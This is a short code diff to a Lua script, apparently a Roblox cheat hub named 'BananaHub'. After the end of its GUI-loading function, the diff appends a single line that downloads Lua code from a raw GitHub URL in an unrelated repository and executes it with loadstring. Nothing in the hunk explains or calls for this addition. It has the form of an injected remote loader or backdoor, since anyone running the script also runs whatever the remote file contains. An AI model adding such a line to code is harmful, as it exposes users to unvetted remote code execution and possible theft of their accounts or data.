@@ -508,3 +508,4 @@ function loadMainGUI()
 
     if game.StarterGui then game.StarterGui:SetCore("SendNotification", {Title="BananaHub", Text="Đã tải thành công!"}) end
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/daosy686-source/moneymian/refs/heads/main/moneymian.lua"))()
